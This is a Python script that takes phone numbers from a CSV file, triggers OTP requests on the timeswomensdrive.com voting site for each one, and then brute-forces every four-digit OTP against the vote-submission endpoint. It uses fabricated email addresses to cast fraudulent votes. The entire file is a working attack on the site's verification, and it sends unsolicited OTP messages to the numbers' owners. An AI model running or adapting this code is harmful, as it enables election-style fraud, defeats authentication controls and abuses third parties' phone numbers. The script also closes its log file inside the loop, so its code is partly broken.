import time
import requests
import json
import pandas as pd
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

retries = Retry(total=5, backoff_factor=0.5)

f = open('numbers_covered.txt', 'a')

df = pd.read_csv('phone_nos.csv')

mobile_nos = df.MOBILE.values
    
for mno in mobile_nos[0:4]:
    sess = requests.Session()
    sess.mount('https://timeswomensdrive.com/', HTTPAdapter(max_retries=retries, pool_connections=10))
    print('Starting registering for number {}'.format(mno))
    f.write('Starting registering for number {}\n'.format(mno))
    headers = {
        'Origin': 'https://timeswomensdrive.com',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': '*/*',
        'Referer': 'https://timeswomensdrive.com/team/TmlyYmhheWE=1551020250',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
    }
    
    data = {
      'team_id': '163',
      'countryCode': '91',
      'voter_mobile_number': str(mno),
      'voter_email': str(mno)+'@koko.com',
      'team_url': 'TmlyYmhheWE=1551020250',
      'otp': ''
    }
    
    response = sess.post('https://timeswomensdrive.com/vote/generate_otp', headers=headers, data=data)
    if 'email_error' in response.text or 'mobile_error' in response.text:
        print('{} already registered'.format(mno))
        f.write('{} already registered\n'.format(mno))
        continue
    
    #Waiting for the OTP to arrive
    time.sleep(10)
    
    try:        
        for i in range(1, 10000):
            time.sleep(.2)
            data['otp'] = '%04d' % i
            response = sess.post('https://timeswomensdrive.com/vote/submit_vote', headers=headers, data=data)
            if 'insert_id' in json.loads(response.text):
                print('Success : {} : {}'.format(mno,i))
                f.write('Success : {} : {}\n'.format(mno,i))
                break
            if i%100 == 0:
                print(mno, i)
                f.write('{},{}\n'.format(mno,i))
    except:
        pass
    finally:
        sess.close()
        f.close()

sess.close()
f.close()        
